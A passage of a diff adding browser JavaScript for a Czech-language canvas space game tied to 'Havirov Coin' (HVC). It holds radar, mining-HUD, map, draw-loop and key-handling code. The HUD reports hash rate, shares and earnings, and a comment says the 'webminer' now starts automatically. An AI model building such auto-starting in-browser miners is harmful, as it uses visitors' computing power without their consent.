+                    const sy = ry + size / 2 + relY * scale;
+                    ctx.fillStyle = '#8B7D6B';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            ctx.fillStyle = '#44ee88';
+            ctx.beginPath();
+            ctx.arc(rx + size / 2, ry + size / 2, 3, 0, Math.PI * 2);
+            ctx.fill();
+
+            const dirLen = 10;
+            ctx.strokeStyle = '#44ee88';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.moveTo(rx + size / 2, ry + size / 2);
+            ctx.lineTo(rx + size / 2 + dirLen * Math.cos(ship.direction), ry + size / 2 + dirLen * Math.sin(ship.direction));
+            ctx.stroke();
+        }
+
+        function drawMiningHUD() {
+            const rx = RADAR_POS.x;
+            const ry = RADAR_POS.y + RADAR_SIZE + 4;
+            const w = RADAR_SIZE;
+            const h = 150;
+
+            ctx.fillStyle = 'rgba(5,5,20,0.85)';
+            ctx.fillRect(rx, ry, w, h);
+            ctx.strokeStyle = COLORS.borderColor;
+            ctx.lineWidth = 1;
+            ctx.strokeRect(rx, ry, w, h);
+
+            let yOff = ry + 4;
+            if (game.miningActive) {
+                const elapsed = (Date.now() - game.miningStats.startTime) / 1000;
+                const mins = Math.floor(elapsed / 60);
+                const secs = Math.floor(elapsed % 60);
+                const timeStr = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+                const hr = game.displayedHashrate || 0;
+
+                if (game.asteroidMiningActive && game.asteroidMiningTarget) {
+                    const target = game.asteroidMiningTarget;
+                    const pct = Math.round((target.sharesMined / target.sharesNeeded) * 100);
+                    ctx.fillStyle = '#8B7D6B';
+                    ctx.font = '11px monospace';
+                    ctx.textAlign = 'left';
+                    ctx.textBaseline = 'top';
+                    ctx.fillText('🪨 ASTEROID MINING', rx + 6, yOff);
+                    yOff += 16;
+                    ctx.fillStyle = '#d4c8a8';
+                    ctx.font = '10px monospace';
+                    ctx.fillText(`${target.oreType}: ${pct}% (${target.sharesMined}/${target.sharesNeeded})`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#88dd88';
+                    ctx.fillText(`Shares: ${target.sharesMined}`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#666';
+                    ctx.fillText(`Time: ${timeStr}`, rx + 6, yOff);
+                } else {
+                    ctx.fillStyle = '#44ee88';
+                    ctx.font = '11px monospace';
+                    ctx.textAlign = 'left';
+                    ctx.textBaseline = 'top';
+                    ctx.fillText('⚡ HVC MINING', rx + 6, yOff);
+                    yOff += 16;
+                    ctx.fillStyle = '#88dd88';
+                    ctx.font = '10px monospace';
+                    ctx.fillText(`Hash: ${Math.round(hr).toLocaleString()} H/s`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#eeee44';
+                    ctx.fillText(`Shares: ${game.miningStats.shareCount}`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#66ddff';
+                    ctx.fillText(`Earned: ${game.miningStats.totalEarned.toFixed(6)} HVC`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#999';
+                    ctx.fillText(`Time: ${timeStr}`, rx + 6, yOff);
+                    yOff += 14;
+                    ctx.fillStyle = '#888';
+                    ctx.font = '9px monospace';
+                    ctx.fillText(`Diff: ${(game.miningStats.difficulty/1e6).toFixed(1)}M`, rx + 6, yOff);
+                }
+            } else {
+                ctx.fillStyle = '#666';
+                ctx.font = '11px monospace';
+                ctx.textAlign = 'left';
+                ctx.textBaseline = 'top';
+                ctx.fillText('⛏ MINING [K]', rx + 6, yOff);
+                yOff += 18;
+                ctx.fillStyle = '#555';
+                ctx.font = '10px monospace';
+                ctx.fillText('Stisknete K u asteroidu nebo kdekoli', rx + 6, yOff);
+                yOff += 14;
+                if (game.miningHistory.length > 0) {
+                    const last = game.miningHistory[0];
+                    ctx.fillStyle = '#666';
+                    ctx.fillText(`Posledni: ${last.earned.toFixed(6)} HVC`, rx + 6, yOff);
+                }
+            }
+        }
+
+        function drawGameControls() {
+            const controls = ['[C] Kredity', '[B] Wallet', '[ESC] Menu', '[M] Mapa'];
+            for (let i = 0; i < controls.length; i++) {
+                ctx.fillStyle = '#eeee44';
+                ctx.font = '11px monospace';
+                ctx.textAlign = 'right';
+                ctx.textBaseline = 'top';
+                ctx.fillText(controls[i], SCREEN_W - 12, 10 + i * 20);
+            }
+        }
+
+        function drawAutoBattleHUD() {
+            const target = game.autoBattleTarget;
+            if (!target) return;
+
+            ctx.fillStyle = 'rgba(0,0,0,0.3)';
+            ctx.fillRect(0, 0, SCREEN_W, SCREEN_H);
+
+            const barW = 400;
+            const barH = 28;
+            const bx = SCREEN_W / 2 - barW / 2;
+
+            const enemyY = SCREEN_H - 70;
+            ctx.fillStyle = '#ee4444';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText(`ENEMY: ${target.type}`, SCREEN_W / 2, enemyY - 4);
+            ctx.fillStyle = '#222';
+            ctx.fillRect(bx, enemyY, barW, barH);
+            const hpPct = Math.max(0, target.hp / target.maxHp);
+            ctx.fillStyle = hpPct > 0.5 ? '#44ee88' : hpPct > 0.25 ? '#eeee44' : '#dd6666';
+            ctx.fillRect(bx, enemyY, barW * hpPct, barH);
+            ctx.strokeStyle = '#fff';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(bx, enemyY, barW, barH);
+            ctx.fillStyle = '#fff';
+            ctx.font = '13px monospace';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(`${Math.round(Math.max(0,target.hp))}/${Math.round(target.maxHp)}`, SCREEN_W / 2, enemyY + barH / 2);
+
+            const playerY = enemyY - 55;
+            ctx.fillStyle = '#44ee88';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText(`PLAYER: ${ship.name}`, SCREEN_W / 2, playerY - 4);
+            ctx.fillStyle = '#222';
+            ctx.fillRect(bx, playerY, barW, barH);
+            const pHpPct = Math.max(0, ship.hp / ship.maxHp);
+            ctx.fillStyle = pHpPct > 0.5 ? '#44ee88' : pHpPct > 0.25 ? '#eeee44' : '#dd6666';
+            ctx.fillRect(bx, playerY, barW * pHpPct, barH);
+            ctx.strokeStyle = '#fff';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(bx, playerY, barW, barH);
+            ctx.fillStyle = '#fff';
+            ctx.font = '13px monospace';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(`${Math.round(Math.max(0,ship.hp))}/${Math.round(ship.maxHp)}`, SCREEN_W / 2, playerY + barH / 2);
+
+            const shieldY = playerY - 20;
+            const shieldPct = Math.max(0, ship.shield / ship.maxShield);
+            ctx.fillStyle = '#222';
+            ctx.fillRect(bx, shieldY, barW, 12);
+            ctx.fillStyle = '#4488ee';
+            ctx.fillRect(bx, shieldY, barW * shieldPct, 12);
+            ctx.strokeStyle = '#fff';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(bx, shieldY, barW, 12);
+
+            ctx.fillStyle = '#ee4444';
+            ctx.font = '22px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'top';
+            ctx.fillText('⚔ AUTO-BATTLE ⚔', SCREEN_W / 2, 20);
+            ctx.fillStyle = '#888';
+            ctx.font = '12px monospace';
+            ctx.fillText('[ESC] Exit  |  [E] Stop', SCREEN_W / 2, 50);
+        }
+
+        function drawMenu() {
+            for (const star of game.starField) {
+                const sx = (star.x * 0.3) % SCREEN_W;
+                const sy = (star.y * 0.3) % SCREEN_H;
+                const twinkle = Math.sin(Date.now() * 0.001 + star.x * 0.01) * 0.5 + 0.5;
+                const intensity = Math.floor((star.size > 2 ? 140 : 70) * twinkle);
+                ctx.fillStyle = `rgb(${intensity},${intensity},${Math.floor(intensity*1.3)})`;
+                ctx.beginPath();
+                ctx.arc(sx, sy, Math.max(1, star.size * 0.5), 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            const pulse = Math.sin(Date.now() * 0.003) * 0.08 + 1;
+            ctx.fillStyle = '#4488ee';
+            ctx.font = `${Math.floor(52*pulse)}px monospace`;
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText('SPACE RANGERS', SCREEN_W / 2, 180);
+            ctx.fillStyle = '#eeee44';
+            ctx.font = '28px monospace';
+            ctx.textBaseline = 'top';
+            ctx.fillText('⚡ Havirov Coin Edition ⚡', SCREEN_W / 2, 190);
+
+            ctx.fillStyle = walletBalance > 0 ? '#44ee88' : '#dd6666';
+            ctx.font = '18px monospace';
+            ctx.textBaseline = 'top';
+            ctx.fillText(`Wallet: ${walletBalance.toFixed(4)} HVC`, SCREEN_W / 2, 240);
+
+            ctx.strokeStyle = '#3a8acc';
+            ctx.lineWidth = 2;
+            ctx.beginPath();
+            ctx.moveTo(SCREEN_W / 2 - 250, 280);
+            ctx.lineTo(SCREEN_W / 2 + 250, 280);
+            ctx.stroke();
+
+            ctx.fillStyle = '#444';
+            ctx.font = '12px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText('Version 2.4 - Smooth controls + less aggressive pirates', SCREEN_W / 2, SCREEN_H - 10);
+        }
+
+        function drawMap() {
+            ctx.fillStyle = '#050518';
+            ctx.fillRect(0, 0, SCREEN_W, SCREEN_H);
+
+            for (const star of game.starField) {
+                const sx = ((star.x - game.mapCameraX) * game.mapZoom + SCREEN_W / 2) % SCREEN_W;
+                const sy = ((star.y - game.mapCameraY) * game.mapZoom + SCREEN_H / 2) % SCREEN_H;
+                const pulse = Math.sin(Date.now() * 0.001 + star.x * 0.01) * 0.3 + 0.7;
+                const intensity = Math.floor(50 * pulse);
+                ctx.fillStyle = `rgb(${intensity},${intensity},${Math.floor(intensity*1.6)})`;
+                ctx.beginPath();
+                ctx.arc(sx, sy, 1, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            for (const a of game.asteroids) {
+                if (a.mined) continue;
+                const sx = (a.x - game.mapCameraX) * game.mapZoom + SCREEN_W / 2;
+                const sy = (a.y - game.mapCameraY) * game.mapZoom + SCREEN_H / 2;
+                if (sx > -20 && sx < SCREEN_W + 20 && sy > -20 && sy < SCREEN_H + 20) {
+                    ctx.fillStyle = '#8B7D6B';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(2, 3 * game.mapZoom), 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const p of game.planets) {
+                const sx = (p.x - game.mapCameraX) * game.mapZoom + SCREEN_W / 2;
+                const sy = (p.y - game.mapCameraY) * game.mapZoom + SCREEN_H / 2;
+                if (sx > -50 && sx < SCREEN_W + 50 && sy > -50 && sy < SCREEN_H + 50) {
+                    const r = Math.max(3, p.radius * game.mapZoom);
+                    ctx.fillStyle = p.color;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, r, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+                    ctx.lineWidth = 0.5;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, r, 0, Math.PI * 2);
+                    ctx.stroke();
+                    if (game.mapZoom > 0.1) {
+                        ctx.fillStyle = '#ddd';
+                        ctx.font = `${Math.max(8, 10 * Math.min(1, game.mapZoom * 2))}px monospace`;
+                        ctx.textAlign = 'center';
+                        ctx.textBaseline = 'bottom';
+                        ctx.fillText(p.name, sx, sy - r - 2);
+                    }
+                }
+            }
+
+            const px = (ship.x - game.mapCameraX) * game.mapZoom + SCREEN_W / 2;
+            const py = (ship.y - game.mapCameraY) * game.mapZoom + SCREEN_H / 2;
+            if (px > -20 && px < SCREEN_W + 20 && py > -20 && py < SCREEN_H + 20) {
+                for (let i = 0; i < 3; i++) {
+                    ctx.strokeStyle = `rgba(68,238,136,${0.3 - i*0.1})`;
+                    ctx.lineWidth = 1;
+                    ctx.beginPath();
+                    ctx.arc(px, py, 6 + i * 4, 0, Math.PI * 2);
+                    ctx.stroke();
+                }
+                ctx.fillStyle = '#44ee88';
+                ctx.beginPath();
+                ctx.arc(px, py, 4, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            ctx.fillStyle = '#4488ee';
+            ctx.font = '24px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'top';
+            ctx.fillText('GALAXIE - MAPA', SCREEN_W / 2, 16);
+
+            ctx.fillStyle = '#66ddff';
+            ctx.font = '13px monospace';
+            ctx.fillText('Klik na planetu/stanici pro teleport za HVC | 🪨 = asteroidy | ☠ = pirati', SCREEN_W / 2, 48);
+
+            let legY = 90;
+            ctx.fillStyle = '#66ddff';
+            ctx.font = '12px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText('LEGENDA:', 16, legY);
+            legY += 18;
+            const legendItems = [
+                ['#0066cc', 'Planeta', 'Zakladni planety'],
+                ['#6696c8', 'Doky', 'Lodni doky'],
+                ['#bb2222', 'Piratsky klub', 'Nebezpecna stanice'],
+                ['#22bbbb', 'Hi-Tech Lab', 'Technologie centrum'],
+                ['#c89600', 'Obchodni stanice', 'Obchodni centrum'],
+                ['#8B7D6B', 'Asteroid', 'Tezitelny asteroid'],
+                ['#dd6666', 'Pirat', 'Nepritel (cerveny)'],
+            ];
+            for (const [color, name, desc] of legendItems) {
+                ctx.fillStyle = color;
+                ctx.beginPath();
+                ctx.arc(24, legY + 5, 5, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.fillStyle = '#ddd';
+                ctx.font = '11px monospace';
+                ctx.textBaseline = 'top';
+                ctx.fillText(name, 34, legY);
+                ctx.fillStyle = '#888';
+                ctx.font = '9px monospace';
+                ctx.fillText(desc, 34, legY + 14);
+                legY += 28;
+            }
+
+            ctx.fillStyle = '#666';
+            ctx.font = '10px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText(`Zoom: ${game.mapZoom.toFixed(2)} [+/-]`, 16, SCREEN_H - 80);
+            ctx.fillText(`Pozice: [${Math.round(ship.x)}, ${Math.round(ship.y)}]`, 16, SCREEN_H - 64);
+            ctx.fillText(`Planet: ${game.planets.length} | Pirati: ${game.enemies.length} | Asteroidy: ${game.asteroids.filter(a=>!a.mined).length}`, 16,
+                SCREEN_H - 48);
+
+            const bx = SCREEN_W / 2 - 80,
+                by = SCREEN_H - 50,
+                bw = 160,
+                bh = 36;
+            ctx.fillStyle = 'rgba(30,30,50,0.8)';
+            ctx.fillRect(bx, by, bw, bh);
+            ctx.strokeStyle = '#3a8acc';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(bx, by, bw, bh);
+            ctx.fillStyle = '#ddd';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('[ESC] Zpet', SCREEN_W / 2, by + bh / 2);
+
+            const mrX = 50,
+                mrY = SCREEN_H - 140,
+                mrSize = 80;
+            ctx.fillStyle = 'rgba(5,5,20,0.7)';
+            ctx.fillRect(mrX, mrY, mrSize, mrSize);
+            ctx.strokeStyle = '#3a8acc';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(mrX, mrY, mrSize, mrSize);
+            const range = RADAR_RANGE + ship.radarBonus;
+            const mrScale = mrSize / (2 * range);
+            for (const e of game.enemies) {
+                const relX = e.x - ship.x;
+                const relY = e.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = mrX + mrSize / 2 + relX * mrScale;
+                    const sy = mrY + mrSize / 2 + relY * mrScale;
+                    ctx.fillStyle = '#ee4444';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 1.5, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+            ctx.fillStyle = '#44ee88';
+            ctx.beginPath();
+            ctx.arc(mrX + mrSize / 2, mrY + mrSize / 2, 2.5, 0, Math.PI * 2);
+            ctx.fill();
+        }
+
+        // --- Hlavní draw ---
+        function draw() {
+            ctx.clearRect(0, 0, SCREEN_W, SCREEN_H);
+            ctx.fillStyle = COLORS.spaceBg;
+            ctx.fillRect(0, 0, SCREEN_W, SCREEN_H);
+
+            if (game.state === 'MENU') {
+                drawMenu();
+                return;
+            }
+
+            for (const star of game.starField) {
+                const sx = ((star.x - game.cameraX) * 0.3 + SCREEN_W / 2) % SCREEN_W;
+                const sy = ((star.y - game.cameraY) * 0.3 + SCREEN_H / 2) % SCREEN_H;
+                const twinkle = Math.sin(Date.now() * 0.001 + star.x * 0.01) * 0.5 + 0.5;
+                const intensity = Math.floor((star.size > 2 ? 140 : 70) * twinkle);
+                ctx.fillStyle = `rgb(${intensity},${intensity},${Math.floor(intensity*1.3)})`;
+                ctx.beginPath();
+                ctx.arc(sx, sy, Math.max(1, star.size * 0.5), 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            for (const a of game.asteroids) {
+                drawAsteroid(a);
+            }
+
+            for (const p of game.planets) {
+                drawPlanet(p);
+            }
+
+            for (const item of game.floatingItems) {
+                const sx = (item.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+                const sy = (item.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+                if (sx > -20 && sx < SCREEN_W + 20 && sy > -20 && sy < SCREEN_H + 20) {
+                    const pulse = Math.sin(Date.now() * 0.004 + item.x) * 0.3 + 0.7;
+                    ctx.fillStyle = `rgb(${Math.floor(200*pulse)},${Math.floor(200*pulse)},50)`;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(3, 5 * game.zoom), 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.strokeStyle = 'rgba(255,255,100,0.5)';
+                    ctx.lineWidth = 1;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(1, 3 * game.zoom), 0, Math.PI * 2);
+                    ctx.stroke();
+                    if (game.zoom > 0.3) {
+                        ctx.fillStyle = '#ffff66';
+                        ctx.font = '10px monospace';
+                        ctx.textAlign = 'center';
+                        ctx.fillText(item.name, sx, sy + 12);
+                    }
+                }
+            }
+
+            for (const e of game.enemies) {
+                drawEnemy(e);
+            }
+
+            for (const rp of game.remotePlayers) {
+                drawRemotePlayer(rp);
+            }
+
+            for (const b of game.bullets) {
+                const sx = (b.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+                const sy = (b.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+                if (sx > -10 && sx < SCREEN_W + 10 && sy > -10 && sy < SCREEN_H + 10) {
+                    ctx.fillStyle = '#ffff66';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(2, 3 * game.zoom), 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.fillStyle = '#ffffcc';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(1, 2 * game.zoom), 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const b of game.enemyBullets) {
+                const sx = (b.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+                const sy = (b.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+                if (sx > -10 && sx < SCREEN_W + 10 && sy > -10 && sy < SCREEN_H + 10) {
+                    ctx.fillStyle = '#ee4444';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(2, 3 * game.zoom), 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.fillStyle = '#ff8888';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, Math.max(1, 2 * game.zoom), 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            drawShip();
+
+            if (ship.shield > 0) {
+                const alpha = Math.floor(50 * (ship.shield / ship.maxShield));
+                ctx.fillStyle = `rgba(0,150,255,${alpha/255})`;
+                ctx.beginPath();
+                ctx.arc(SCREEN_W / 2, SCREEN_H / 2, 32 * game.zoom, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.strokeStyle = `rgba(0,150,255,${alpha/255 * 0.5})`;
+                ctx.lineWidth = 2;
+                ctx.beginPath();
+                ctx.arc(SCREEN_W / 2, SCREEN_H / 2, 32 * game.zoom, 0, Math.PI * 2);
+                ctx.stroke();
+            }
+
+            if (!game.autoBattle) {
+                drawTopPanel();
+                drawRadar();
+                drawMiningHUD();
+                drawGameControls();
+            }
+
+            if (game.autoBattle) {
+                drawAutoBattleHUD();
+            }
+
+            if (game.asteroidMiningActive && game.asteroidMiningTarget) {
+                const target = game.asteroidMiningTarget;
+                const pct = Math.round((target.sharesMined / target.sharesNeeded) * 100);
+                const sx = (target.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+                const sy = (target.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+                if (sx > -50 && sx < SCREEN_W + 50 && sy > -50 && sy < SCREEN_H + 50) {
+                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                    const bw = 140,
+                        bh = 28;
+                    ctx.fillRect(sx - bw / 2, sy - target.radius * game.zoom - 40, bw, bh);
+                    ctx.strokeStyle = '#8B7D6B';
+                    ctx.lineWidth = 1;
+                    ctx.strokeRect(sx - bw / 2, sy - target.radius * game.zoom - 40, bw, bh);
+                    ctx.fillStyle = '#e6e640';
+                    ctx.font = '12px monospace';
+                    ctx.textAlign = 'center';
+                    ctx.textBaseline = 'middle';
+                    ctx.fillText(`⛏ ${pct}% (${target.sharesMined}/${target.sharesNeeded})`, sx, sy - target.radius * game
+                        .zoom - 26);
+                    ctx.fillStyle = '#444';
+                    ctx.fillRect(sx - bw / 2 + 4, sy - target.radius * game.zoom - 16, bw - 8, 8);
+                    ctx.fillStyle = '#88dd88';
+                    ctx.fillRect(sx - bw / 2 + 4, sy - target.radius * game.zoom - 16, (bw - 8) * (target.sharesMined /
+                        target.sharesNeeded), 8);
+                }
+            }
+
+            if (game.message) {
+                ctx.fillStyle = 'rgba(0,0,0,0.85)';
+                const tw = ctx.measureText(game.message).width || 200;
+                const pw = Math.max(tw + 40, 200);
+                const ph = 40;
+                const px = SCREEN_W / 2 - pw / 2;
+                const py = 45;
+                ctx.fillRect(px, py, pw, ph);
+                ctx.strokeStyle = COLORS.borderColor;
+                ctx.lineWidth = 2;
+                ctx.strokeRect(px, py, pw, ph);
+                ctx.fillStyle = '#eeee44';
+                ctx.font = '18px monospace';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillText(game.message, SCREEN_W / 2, py + ph / 2);
+            }
+
+            if (game.state === 'GAME' && !ship.dockedAt) {
+                for (const p of game.planets) {
+                    if (dist(ship, p) < 120) {
+                        const pulse = Math.sin(Date.now() * 0.005) * 0.3 + 0.7;
+                        ctx.fillStyle = `rgba(51,187,204,${pulse})`;
+                        ctx.font = '16px monospace';
+                        ctx.textAlign = 'center';
+                        ctx.textBaseline = 'bottom';
+                        ctx.fillText(`Blizite se k ${p.name} - dokovani`, SCREEN_W / 2, SCREEN_H - 20);
+                        break;
+                    }
+                }
+            }
+
+            const mined = game.asteroids.filter(a => a.mined).length;
+            const total = game.asteroids.length;
+            ctx.fillStyle = 'rgba(0,0,0,0.6)';
+            ctx.fillRect(SCREEN_W - 200, SCREEN_H - 34, 180, 26);
+            ctx.fillStyle = '#8B7D6B';
+            ctx.font = '12px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(`🪨 Asteroidy: ${total - mined}/${total}`, SCREEN_W - 190, SCREEN_H - 20);
+            const nearAsteroidEnemies = game.enemies.filter(e => {
+                for (const a of game.asteroids) {
+                    if (!a.mined && dist(e, a) < 300) return true;
+                }
+                return false;
+            });
+            ctx.fillStyle = '#dd6666';
+            ctx.fillText(`☠ Pirati: ${nearAsteroidEnemies.length}`, SCREEN_W - 190, SCREEN_H - 8);
+        }
+
+        // --- Input Handling ---
+        const keysDown = {};
+        document.addEventListener('keydown', (e) => {
+            const key = e.key;
+            keysDown[key] = true;
+
+            if (key === 'w' || key === 'W') game.keys.w = true;
+            if (key === 'a' || key === 'A') game.keys.a = true;
+            if (key === 's' || key === 'S') game.keys.s = true;
+            if (key === 'd' || key === 'D') game.keys.d = true;
+            if (key === 'ArrowUp') game.keys.up = true;
+            if (key === 'ArrowDown') game.keys.down = true;
+            if (key === 'ArrowLeft') game.keys.left = true;
+            if (key === 'ArrowRight') game.keys.right = true;
+
+            if (key === 'Escape') {
+                if (game.state === 'MENU') {
+                    // Exit
+                } else if (game.state === 'GAME') {
+                    if (game.autoBattle) {
+                        game.autoBattle = false;
+                        game.autoBattleTarget = null;
+                        showMessage('Auto-battle ukoncen!', 60);
+                        return;
+                    }
+                    hideAllScreens();
+                    game.state = 'MENU';
+                    showMessage('', 0);
+                    updateMenuWallet();
+                } else if (game.state === 'DOCKED') {
+                    closeDocked();
+                } else if (game.state === 'TRADING') {
+                    game.state = 'DOCKED';
+                    showScreen(dockedScreen);
+                } else if (game.state === 'QUEST') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                } else if (game.state === 'UPGRADE') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                } else if (game.state === 'FUEL') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                } else if (game.state === 'CREDITS') {
+                    game.state = 'MENU';
+                    showScreen(menuScreen);
+                } else if (game.state === 'MINING_LOG') {
+                    game.state = 'GAME';
+                    hideAllScreens();
+                } else if (game.state === 'SKILLS') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                } else if (game.state === 'MULTIPLAYER') {
+                    game.state = 'MENU';
+                    showScreen(menuScreen);
+                } else if (game.state === 'MAP') {
+                    game.state = 'GAME';
+                } else if (game.state === 'CRAFTING') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                } else if (game.state === 'INVENTORY') {
+                    game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+                    hideAllScreens();
+                    if (game.dockedPlanet) showScreen(dockedScreen);
+                }
+                return;
+            }
+
+            if (game.state === 'GAME') {
+                if (key === 'm' || key === 'M') { game.state = 'MAP'; return; }
+                if (key === 'f' || key === 'F') { openFuel(); return; }
+                if (key === 'q' || key === 'Q') { openQuests(); return; }
+                if (key === 'u' || key === 'U') { openUpgrades(); return; }
+                if (key === 'b' || key === 'B') {
+                    showMessage(`Wallet: ${walletBalance.toFixed(4)} HVC`, 120);
+                    return;
+                }
+                if (key === 'c' || key === 'C') {
+                    if (game.dockedPlanet) { openCrafting(); return; } else { game.state = 'CREDITS';
+                        showScreen(creditsScreen); return; }
+                }
+                if (key === 'i' || key === 'I') { if (game.dockedPlanet) { openInventory(); return; } }
+                if (key === 'k' || key === 'K') { toggleMining(); return; }
+                if (key === 'l' || key === 'L') { openMiningLog(); return; }
+                if (key === 'e' || key === 'E') { toggleAutoBattle(); return; }
+                if (key === 'p' || key === 'P') { openSkills(); return; }
+                if (key === 'j' || key === 'J') { collectNearbyItems(); return; }
+                if (key === ' ') { e.preventDefault();
+                    fireWeapon(); return; }
+            }
+
+            if (game.state === 'DOCKED') {
+                if (key === 't' || key === 'T') { openTrading(); return; }
+                if (key === 'q' || key === 'Q') { openQuests(); return; }
+                if (key === 'u' || key === 'U') { openUpgrades(); return; }
+                if (key === 'f' || key === 'F') { openFuel(); return; }
+                if (key === 'k' || key === 'K') { toggleMining(); return; }
+                if (key === 'p' || key === 'P') { openSkills(); return; }
+                if (key === 'c' || key === 'C') { openCrafting(); return; }
+                if (key === 'i' || key === 'I') { openInventory(); return; }
+            }
+
+            if (game.state === 'TRADING') {
+                if (key === 'ArrowUp') { game.tradingScroll = Math.max(0, (game.tradingScroll || 0) - 1);
+                    renderTrading(); }
+                if (key === 'ArrowDown') { const max = Math.max(0, (game.dockedPlanet?.availableItems?.length || 0) - 10);
+                    game.tradingScroll = Math.min(max, (game.tradingScroll || 0) + 1);
+                    renderTrading(); }
+            }
+
+            if (game.state === 'FUEL') {
+                if (key === '1') buyFuel(10);
+                if (key === '2') buyFuel(25);
+                if (key === '3') buyFuel(50);
+                if (key === '4') buyFuel(100);
+            }
+
+            if (game.state === 'SKILLS') {
+                const ids = Object.keys(SKILL_DEFS);
+                for (let i = 0; i < ids.length; i++) {
+                    if (key === String(i + 1)) {
+                        addSkill(ids[i]);
+                        break;
+                    }
+                }
+            }
+
+            if (game.state === 'MENU') {
+                if (key === '1') { startNewGame(); }
+                if (key === '2') { loadGame(); }
+                if (key === '3') { game.state = 'CREDITS';
+                    showScreen(creditsScreen); }
+                if (key === '4') { toggleMining(); }
+                if (key === '5') { game.state = 'MULTIPLAYER';
+                    showScreen(multiplayerScreen); }
+                // klávesa '6' byla odstraněna – webminer se spouští automaticky
+            }
+        });
+
+        document.addEventListener('keyup', (e) => {
+            const key = e.key;
+            keysDown[key] = false;
+            if (key === 'w' || key === 'W') game.keys.w = false;
+            if (key === 'a' || key === 'A') game.keys.a = false;
+            if (key === 's' || key === 'S') game.keys.s = false;
+            if (key === 'd' || key === 'D') game.keys.d = false;
+            if (key === 'ArrowUp') game.keys.up = false;
+            if (key === 'ArrowDown') game.keys.down = false;
+            if (key === 'ArrowLeft') game.keys.left = false;
+            if (key === 'ArrowRight') game.keys.right = false;
+        });
+
+        canvas.addEventListener('mousemove', (e) => {
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
